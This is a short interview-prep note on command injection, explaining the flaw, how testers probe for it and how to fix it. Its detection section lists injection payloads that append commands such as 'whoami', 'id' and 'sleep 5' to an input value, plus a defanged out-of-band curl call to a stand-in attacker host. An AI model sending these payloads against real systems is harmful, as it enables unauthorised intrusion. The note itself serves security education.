## 🛡️ Interview Notes: What Is Command Injection?

### ❓ What Is Command Injection?
- **Command Injection** is a critical vulnerability where an attacker executes **arbitrary system commands** on the host OS through a vulnerable application.  
- It happens when user input is unsafely passed to a **system shell** (`bash`, `sh`, `cmd.exe`, etc.) without sanitization.  
- Potential impacts:  
  - 💀 Full system compromise  
  - 📡 Data exfiltration  
  - 🔀 Lateral movement into other systems  
  - 🧩 Persistence and privilege escalation  

---

### 🧪 How to Detect and Exploit Command Injection
- Look for input features that trigger system commands:  
  - Ping/traceroute tools  
  - DNS lookup or whois lookups  
  - File operations or compression utilities  

- Test with defanged payloads:  
  - `127.0.0.1; whoami`  
  - `127.0.0.1 && id`  
  - `127.0.0.1 | uname -a`  
  - `127.0.0.1 $(id)`  

- Blind injection techniques:  
  - Time delays → `127.0.0.1 && sleep 5`  
  - Out-of-band (OOB) requests → `127.0.0.1 && curl hxxp://attacker[.]com`  

- Tools:  
  - 🛠️ Burp Suite for manual fuzzing  
  - 🛠️ Commix for automated testing  
  - 🛠️ Custom scripts  

- Don’t forget to test:  
  - GET and POST parameters  
  - HTTP headers (e.g., `User-Agent`, `X-Forwarded-For`)  
  - File upload metadata  

---

### 🛡️ How to Fix Command Injection
- ✅ Never pass user input directly to system commands  
- ✅ Use safe APIs or libraries instead of shell calls (e.g., `execFile` in Node.js instead of `exec`)  
- ✅ If shell execution is unavoidable:  
  - Strict input whitelisting  
  - Proper argument escaping  
- ✅ Run apps with **least privilege** to reduce impact  
- ✅ Use containerization or sandboxing for isolation  
- ✅ Monitor logs and processes for unusual command execution patterns  

---
